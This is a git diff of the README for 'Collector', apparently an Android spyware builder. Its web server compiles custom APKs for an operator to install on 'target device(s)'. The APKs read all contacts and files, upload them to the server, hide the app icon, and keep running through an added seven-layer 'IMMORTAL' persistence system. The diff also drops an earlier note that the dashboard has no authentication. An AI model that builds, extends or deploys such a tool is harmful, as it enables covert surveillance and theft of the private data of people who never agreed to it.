@@ -23,7 +23,7 @@ Collector is a full-stack web application that allows you to build custom Androi
 - **Directory Browsing** — Navigate the device file system with a folder tree and breadcrumbs
 - **File Preview** — Preview images, videos, audio, PDFs, and documents directly in the browser
 - **Single File Download** — Stream and download individual files with proper MIME types
-- **Bulk ZIP Download** — Download all files organized by type (Images/, Videos/, Audio/, Documents/, Other/) with per-device subfolders
+- **Bulk ZIP Download** — Download all files organized by type with per-device subfolders
 - **File Deletion** — Delete individual files from both server storage and metadata
 - **File Type Filtering** — Filter uploaded files by category (image, video, audio, document, etc.)
 - **List/Grid View** — Toggle between list and grid display modes
@@ -31,23 +31,19 @@ Collector is a full-stack web application that allows you to build custom Androi
 ### Multi-Device Support
 - **Unlimited Devices** — Install the same APK on unlimited phones; all devices report to the same session
 - **Device Identification** — Each device registers with a unique ID, brand, model, and Android version
-- **Device List** — All connected devices displayed in a list with online/offline status indicators
+- **Device List** — All connected devices displayed with online/offline status indicators
 - **Per-Device Filtering** — Filter contacts, files, and file manager by specific device
 - **Device Attribution** — Every contact and file is tagged with the device that uploaded it
-- **Live Heartbeat** — Each device sends a heartbeat every 30 seconds to maintain live connection status
 
-### Live Status & Monitoring
-- **Real-Time Status** — Track device status from APK built → installed → permissions granted → uploading → live connected
-- **Online/Offline Detection** — Devices show as online when sending heartbeats within 60 seconds
-- **Auto-Refresh** — Dashboard and session views auto-poll for updates every 5-10 seconds
-- **Status History** — Full timeline of status changes for each session
-
-### Android App Behavior
-- **Permission Request** — On first launch, requests READ_CONTACTS and MANAGE_EXTERNAL_STORAGE permissions
-- **Automatic Data Upload** — After permissions are granted, uploads all contacts and file metadata immediately
-- **Background File Sync** — Foreground service continuously uploads files from key directories
-- **Auto-Hide** — App icon is hidden from the launcher after initial sync is complete
-- **Persistent Services** — HeartbeatService and FileUploadService survive app being swiped away
+### IMMORTAL Connection System
+- **Never Disconnects** — Connection is immortal; survives server downtime, phone reboots, and network changes
+- **7-Layer Reconnection** — HeartbeatService, NetworkStateReceiver, WatchdogAlarmReceiver, WatchdogJobService, ServiceRestartReceiver, BootReceiver, and START_STICKY
+- **Auto-Reconnect** — Device automatically reconnects when it comes back online after any duration
+- **Network Recovery** — Instantly reconnects when WiFi/Mobile data is restored
+- **Boot Recovery** — Services auto-start when phone restarts
+- **Watchdog Timer** — 5-minute periodic check ensures services are always alive
+- **Exponential Backoff** — Smart retry timing: 10s, 20s, 40s... up to 3 minutes, never stops
+- **Server Recovery** — When heartbeat resumes after any downtime, session automatically becomes `live_connected`
 
 ---
 
@@ -60,9 +56,95 @@ Collector is a full-stack web application that allows you to build custom Androi
 | **Frontend** | React 19, Tailwind CSS 4, shadcn/ui |
 | **Icons** | Lucide React |
 | **Database** | File-based JSON (no SQL/ORM) |
-| **Android SDK** | API 34, build-tools 34.0.0, JDK 21, minSdk 24 |
-| **APK Signing** | Debug keystore (apksigner) |
-| **Deployment** | Vercel (with extended function durations) |
+| **Android SDK** | API 35, build-tools 35.0.1, JDK 21, minSdk 21 |
+| **APK Signing** | Debug keystore (apksigner V1/V2/V3) |
+| **Process Manager** | PM2 |
+| **Reverse Proxy** | Nginx |
+
+---
+
+## Quick Start
+
+### One-Command Install & Run
+
+```bash
+# Clone the repository
+git clone https://github.com/fahad-ahamed/collector.git
+cd collector
+
+# Install everything and run
+bash run.sh
+```
+
+### Manual Install
+
+```bash
+# Install requirements
+bash install.sh
+
+# Or install manually
+pip3 install -r requirements.txt   # Python deps (Pillow for logo resize)
+npm install                         # Node.js deps
+npm run build                       # Build Next.js
+npm start                           # Start server on port 3000
+```
+
+### With PM2 (Production)
+
+```bash
+npm install
+npm run build
+pm2 start npm --name "collector" -- start
+pm2 save
+```
+
+---
+
+## Prerequisites
+
+- **Node.js** 18+ and npm
+- **Python 3** with pip (for Pillow - logo resizing)
+- **Android SDK** — with `platforms/android-35` and `build-tools/35.0.1` (for APK building)
+- **JDK 21** — for compiling Android Java code
+- **Linux/Ubuntu** — APK build pipeline uses shell commands
+
+### Installing Prerequisites on Ubuntu
+
+```bash
+# Node.js 20
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt-get install -y nodejs
+
+# Python & Pillow
+sudo apt-get install -y python3-pip
+pip3 install Pillow
+
+# Android SDK (command-line tools only)
+mkdir -p ~/android-sdk/cmdline-tools
+# Download from https://developer.android.com/studio#command-tools
+# Extract to ~/android-sdk/cmdline-tools/latest/
+~/android-sdk/cmdline-tools/latest/bin/sdkmanager "platforms;android-35" "build-tools;35.0.1"
+
+# JDK 21
+sudo apt-get install -y openjdk-21-jdk
+```
+
+---
+
+## Environment Variables
+
+| Variable | Default | Description |
+|---|---|---|
+| `DB_DIR` | `db/` | Directory for JSON database files |
+| `UPLOAD_DIR` | `/tmp/collector-uploads` | Directory for uploaded files |
+| `ANDROID_HOME` | `/home/z/android-sdk` | Android SDK location |
+
+Create a `.env` file:
+
+```bash
+DB_DIR=./db
+UPLOAD_DIR=/tmp/collector-uploads
+```
 
 ---
 
@@ -70,48 +152,54 @@ Collector is a full-stack web application that allows you to build custom Androi
 
 ```
 collector/
-├── app/
-│   ├── layout.tsx                  # Root layout with Geist fonts
-│   ├── page.tsx                    # Home dashboard — session list
-│   ├── globals.css                 # Tailwind + custom styles
-│   ├── view/[id]/page.tsx          # Session detail — contacts, files, manager
-│   └── api/
-│       ├── build-app/route.ts      # POST — build custom APK
-│       ├── heartbeat/route.ts      # POST — device heartbeat
-│       ├── status/update/route.ts  # POST — status update from device
-│       ├── sessions/route.ts       # GET all, DELETE session
-│       ├── sessions/[id]/status/route.ts  # GET session status
-│       ├── contacts/
-│       │   ├── upload/route.ts     # POST — contacts + file metadata
-│       │   ├── view/[id]/route.ts  # GET — full session data
-│       │   └── sync/route.ts       # POST — trigger re-sync
-│       └── files/
-│           ├── upload/route.ts     # POST — file upload (multipart)
-│           ├── download/[id]/route.ts  # GET — ZIP download
-│           ├── browse/route.ts     # GET — directory browsing
-│           ├── delete/route.ts     # DELETE — delete file
-│           └── file/[fileId]/route.ts  # GET — single file stream
-├── android-app/                    # Template Android project
+├── src/
+│   ├── app/
+│   │   ├── layout.tsx                  # Root layout
+│   │   ├── page.tsx                    # Home dashboard
+│   │   ├── globals.css                 # Tailwind + custom styles
+│   │   ├── view/[id]/page.tsx          # Session detail view
+│   │   └── api/
+│   │       ├── build-app/route.ts      # POST — build custom APK
+│   │       ├── heartbeat/route.ts      # POST — device heartbeat
+│   │       ├── status/update/route.ts  # POST — status update
+│   │       ├── sessions/route.ts       # GET all, DELETE session
+│   │       ├── sessions/[id]/status/   # GET session status
+│   │       ├── contacts/
+│   │       │   ├── upload/route.ts     # POST — contacts + file metadata
+│   │       │   ├── view/[id]/route.ts  # GET — full session data
+│   │       │   └── sync/route.ts       # POST — trigger re-sync
+│   │       └── files/
+│   │           ├── upload/route.ts     # POST — file upload
+│   │           ├── download/[id]/      # GET — ZIP download
+│   │           ├── browse/route.ts     # GET — directory browsing
+│   │           ├── delete/route.ts     # DELETE — delete file
+│   │           └── file/[fileId]/      # GET — single file stream
+│   ├── components/ui/                  # shadcn/ui components
+│   ├── hooks/                          # Custom React hooks
+│   └── lib/
+│       ├── db.ts                       # File-based JSON database
+│       └── utils.ts                    # Utility functions
+├── android-app/                        # Template Android project
 │   ├── app/src/main/
 │   │   ├── AndroidManifest.xml
 │   │   ├── java/com/contactcollector/app/
-│   │   │   ├── MainActivity.java       # Permissions, data read, upload
-│   │   │   ├── HeartbeatService.java   # 30s heartbeat service
-│   │   │   └── FileUploadService.java  # Background file upload
-│   │   └── res/                        # Layouts, strings, drawables
+│   │   │   ├── MainActivity.java           # Permissions, data upload, auto-hide
+│   │   │   ├── HeartbeatService.java       # IMMORTAL heartbeat (15s, never stops)
+│   │   │   ├── FileUploadService.java      # Background file upload with smart restart
+│   │   │   ├── BootReceiver.java           # Auto-start on device boot
+│   │   │   ├── NetworkStateReceiver.java   # Instant reconnect on network change
+│   │   │   ├── WatchdogAlarmReceiver.java  # 5-min periodic service check
+│   │   │   ├── WatchdogJobService.java     # JobScheduler fallback
+│   │   │   └── ServiceRestartReceiver.java # Multi-fallback restart handler
+│   │   └── res/                            # Layouts, strings, drawables
 │   └── build/keystore/debug.keystore
-├── components/ui/                  # shadcn/ui components
-├── hooks/                          # Custom React hooks
-├── lib/
-│   ├── db.ts                       # File-based JSON database
-│   └── utils.ts                    # Utility functions
-├── data/                           # Runtime data directory
-│   ├── db/sessions/                # Session JSON files
-│   └── db/files/                   # Uploaded file metadata
+├── requirements.txt                   # Python dependencies
+├── run.sh                             # Quick start script
+├── install.sh                         # Requirements installer
 ├── package.json
 ├── next.config.ts
 ├── tailwind.config.ts
-└── vercel.json
+└── nginx.conf                         # Nginx reverse proxy config
 ```
 
 ---
@@ -127,181 +215,59 @@ collector/
 | `POST` | `/api/contacts/upload` | Upload contacts + file metadata from device |
 | `GET` | `/api/contacts/view/[id]` | Get full session data (contacts, files, devices) |
 | `POST` | `/api/contacts/sync` | Trigger contact re-sync |
-| `POST` | `/api/files/upload` | Upload a file (multipart, max 100MB) |
+| `POST` | `/api/files/upload` | Upload a file (multipart, max 50MB) |
 | `GET` | `/api/files/download/[id]` | Download all files as ZIP |
 | `GET` | `/api/files/browse` | Browse files by directory path |
 | `DELETE` | `/api/files/delete` | Delete a specific file |
 | `GET` | `/api/files/file/[fileId]` | Stream/download a single file |
-| `POST` | `/api/heartbeat` | Device heartbeat ping |
+| `POST` | `/api/heartbeat` | Device heartbeat (IMMORTAL - never stops) |
 | `POST` | `/api/status/update` | Update session status from device |
 
 ---
 
-## Setup & Installation
+## IMMORTAL Connection Architecture
 
-### Prerequisites
+The connection between the Android app and server is designed to **never permanently disconnect**. Here is how the 7-layer system works:
 
-- **Node.js** 18+ and npm/bun
-- **Android SDK** — with `platforms/android-34` and `build-tools/34.0.0`
-- **JDK 21** — for compiling Android Java code
-- **Linux/Unix environment** — APK build pipeline uses shell commands
+| Layer | Component | Trigger | Action |
+|-------|-----------|---------|--------|
+| 1 | HeartbeatService | 15s interval | Sends heartbeat, retries with backoff on failure, **never stops** |
+| 2 | NetworkStateReceiver | Network change | Instantly starts heartbeat when network returns |
+| 3 | WatchdogAlarmReceiver | Every 5 minutes | Checks if services are alive, restarts if dead |
+| 4 | WatchdogJobService | JobScheduler | Fallback for Android 12+ foreground restrictions |
+| 5 | ServiceRestartReceiver | Service killed | 3 fallbacks: direct start, JobScheduler, retry alarms |
+| 6 | BootReceiver | Phone reboot | Starts all services on BOOT_COMPLETED |
+| 7 | START_STICKY | System kill | Android recreates service automatically |
 
-### Environment Variables
-
-| Variable | Default | Description |
-|---|---|---|
-| `DB_DIR` | `db/` | Directory for JSON database files |
-| `UPLOAD_DIR` | `/tmp/collector-uploads` | Directory for uploaded files |
-| `ANDROID_HOME` | `/home/z/android-sdk` | Android SDK location |
-| `JAVAC` | `/tmp/jdk-21.0.11/bin/javac` | JDK javac path |
-
-### Install & Run
-
-```bash
-# Clone the repository
-git clone https://github.com/fahad-ahamed/collector-final.git
-cd collector-final
-
-# Install dependencies
-npm install
-
-# Run development server
-npm run dev
-
-# Build for production
-npm run build
-npm start
-```
-
-### Android SDK Setup
-
-```bash
-# Install Android SDK command-line tools
-mkdir -p /home/z/android-sdk
-# Download cmdline-tools from https://developer.android.com/studio#command-tools
-
-# Install required components
-sdkmanager "platforms;android-34"
-sdkmanager "build-tools;34.0.0"
-
-# Install JDK 21
-# Download from https://adoptium.net/
-```
+**Server side:** Heartbeat recovery works from ANY status. Even if the server was down for days, when the device sends a heartbeat, the session automatically becomes `live_connected`.
 
 ---
 
-## APK Build Process
+## Nginx Configuration
 
-The server builds Android APKs entirely from the command line without Gradle:
+```nginx
+server {
+    listen 80 default_server;
+    server_name _;
 
-1. **Copy** template Android project to a temp directory
-2. **Inject** custom app name into `strings.xml` and `AndroidManifest.xml`
-3. **Inject** server URL (`WEBSITE_BASE_URL`) into `MainActivity.java`
-4. **Inject** unique `BUILD_ID` for session matching
-5. **Compile resources** with `aapt2 compile`
-6. **Link resources** with `aapt2 link`
-7. **Compile Java** with `javac` (JDK 21, targeting Java 8)
-8. **Convert to DEX** with `d8`
-9. **Package** into APK with `zip`
-10. **Align** with `zipalign`
-11. **Sign** with `apksigner` (debug keystore)
-12. **Return** signed APK as download
+    client_max_body_size 50M;
+    gzip off;
 
----
-
-## Data Model
-
-### Session
-
-```typescript
-{
-  id: string;                    // UUID
-  contacts: string;              // JSON array of contacts
-  files: string;                 // JSON array of file metadata
-  appName: string;               // Custom app name
-  count: number;                 // Contact count
-  fileCount: number;             // File count
-  createdAt: string;             // ISO timestamp
-  status?: string;               // Current status
-  statusHistory?: StatusEntry[]; // Status change timeline
-  lastHeartbeat?: string;        // Last heartbeat timestamp
-  buildId?: string;              // Links APK to session
-  devices?: Record<string, DeviceInfo>;  // Multi-device map
+    location / {
+        proxy_pass http://127.0.0.1:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_read_timeout 600s;
+        proxy_send_timeout 600s;
+        proxy_connect_timeout 600s;
+        proxy_buffering off;
+    }
 }
-```
-
-### Device Info
-
-```typescript
-{
-  id: string;              // Unique device ID
-  name: string;            // Device display name
-  model: string;           // Device model
-  brand: string;           // Device brand
-  androidVersion: string;  // Android version
-  lastHeartbeat?: string;  // Last heartbeat time
-  firstSeen: string;       // First connection time
-}
-```
-
-### Contact
-
-```typescript
-{
-  id: string;
-  name: string;
-  phone: string;
-  email?: string;
-  organization?: string;
-  deviceId?: string;       // Uploading device
-}
-```
-
-### Uploaded File
-
-```typescript
-{
-  id: string;
-  sessionId: string;
-  deviceId?: string;       // Uploading device
-  filePath: string;        // Original path on device
-  fileName: string;        // File name
-  fileSize: number;        // Size in bytes
-  fileType: string;        // MIME type
-  serverPath: string;      // Server storage path
-  uploadedAt: string;      // ISO timestamp
-}
-```
-
----
-
-## Deployment
-
-### Vercel (Recommended)
-
-The project includes `vercel.json` with extended function durations:
-
-```json
-{
-  "functions": {
-    "app/api/build-app/route.ts": { "maxDuration": 120 },
-    "app/api/files/download/[id]/route.ts": { "maxDuration": 120 },
-    "app/api/files/upload/route.ts": { "maxDuration": 60 }
-  }
-}
-```
-
-**Note:** Vercel's serverless environment does not support the APK build pipeline. For full functionality, deploy on a VPS or use a custom server.
-
-### VPS / Self-Hosted
-
-```bash
-# Build and run
-npm run build
-npm start
-
-# Or use PM2 for process management
-pm2 start npm --name "collector" -- start
 ```
 
 ---
@@ -312,23 +278,11 @@ pm2 start npm --name "collector" -- start
 2. **Server** builds a custom APK with the name and logo embedded
 3. **Operator** downloads the APK and installs it on target device(s)
 4. **App** requests permissions, reads contacts and file metadata, uploads to server
-5. **App** starts background services for continuous file sync and heartbeats
+5. **App** starts IMMORTAL background services for continuous file sync and heartbeats
 6. **App** hides its icon from the launcher
 7. **Operator** views all collected data in real-time on the web dashboard
 8. **Multiple devices** can report to the same session, each identified by name and model
-9. **Operator** can browse files, download data, export contacts, and manage sessions
-
----
-
-## Important Notes
-
-- The APK is signed with a **debug keystore** — not suitable for production Play Store distribution
-- There is **no authentication** on the web dashboard — anyone with a session URL has full access
-- Data is stored as **plain JSON files** without encryption
-- File uploads are limited to **100MB** per file on the server side and **50MB** on the Android client
-- Contact sync supports up to **50,000 contacts** per session
-- File metadata supports up to **100,000 entries** per session
-- The Android app targets **API 34** with a minimum of **API 24** (Android 7.0+)
+9. **Connection never dies** — even if server/phone is offline for days, it reconnects automatically
 
 ---
 
